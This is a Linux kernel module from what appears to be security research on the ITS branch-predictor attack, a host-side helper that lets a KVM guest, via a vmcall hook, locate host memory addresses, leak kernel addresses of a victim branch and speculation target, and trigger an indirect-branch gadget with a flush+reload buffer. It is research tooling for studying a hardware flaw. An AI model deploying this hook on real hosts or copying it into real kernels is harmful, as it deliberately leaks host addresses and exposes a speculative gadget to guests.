#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/pgtable_types.h>
#include <asm/pgtable_64_types.h>
#include <asm/page.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/pgtable.h>

#include <linux/mm.h>
#include <linux/security.h>
#include <linux/userfaultfd_k.h>


#include "lib.h"


MODULE_AUTHOR("Sander Wiebing");
MODULE_DESCRIPTION("Predictor testing");
MODULE_LICENSE("GPL");

#define PHYS_MAP_START 0xffff800000000000
#define PHYS_MAP_END   0xffffc87fffffffff
#define PHYS_ALIGNMENT 1 << 30 // 1 GB
#define HUGE_PAGE_SIZE (1 << 21) // 2 MB


extern uint64_t a_target0(uint64_t * fr_buf);
extern uint64_t a_target1(uint64_t * fr_buf);

typedef uint64_t target_t(uint64_t * arg0);
__attribute__((aligned(64))) target_t *ftable[] = {a_target0, a_target1};


extern void caller1(target_t **ft, uint8_t * fr_buf, uint8_t * secret);

extern void its_victim_ind_branch(void);
extern void its_speculation_target(void);



static void do_indirect_branch(uint8_t * fr_buf, uint8_t * secret) {


    flush(&ftable[0]);
    asm volatile("mfence\n");

    caller1(ftable, fr_buf, secret);

    return;

}


static uint64_t get_host_address(uint64_t page_sid) {

    uint64_t kern_address;
    uint64_t value = 0;

    for (kern_address = page_offset_base; kern_address < PHYS_MAP_END; kern_address += 0x1000)
    {

        if (get_kernel_nofault(value, (uint64_t *)kern_address)) {
            continue;
        }

        if (value == page_sid) {

            pr_info("host address: %px \n", (void *) kern_address);

            return kern_address;
        }

    }

    pr_info("Failed finding host address!\n");

	return 0;

}

#define OPTION_GET_HOST_ADDRESS 0
#define OPTION_GET_VICTIM_ADDRESS 2
#define OPTION_GET_SPECULATION_TARGET_ADDRESS 3
#define OPTION_TRIGGER_GADGET   10

// KVM entry point: The vmm call will call this function with the guest
// provided arguments.
static uint64_t its_kvm_entry(uint64_t option, uint8_t * extra_arg, uint8_t * fr_buf) {


    if (option == OPTION_GET_HOST_ADDRESS ) {
        return get_host_address( (uint64_t) extra_arg);

    } else if (option == OPTION_TRIGGER_GADGET) {
        do_indirect_branch(fr_buf, extra_arg);
        return 1;

    } else if (option == OPTION_GET_VICTIM_ADDRESS) {
        pr_info("its_victim_ind_branch:  %px\n", its_victim_ind_branch);
        return (uint64_t) its_victim_ind_branch + 1;

    } else if (option == OPTION_GET_SPECULATION_TARGET_ADDRESS) {
        pr_info("its_speculation_target: %px\n", its_speculation_target);
        return (uint64_t) its_speculation_target;
    }


    return 0;
}


static int __init its_host_helper_init(void)
{

    pr_info("Initializing\n");

    global_its_entry_point = its_kvm_entry;

	return 0;
}

static void __exit its_host_helper_exit(void)
{
	pr_info("exiting\n");
}

module_init(its_host_helper_init);
module_exit(its_host_helper_exit);
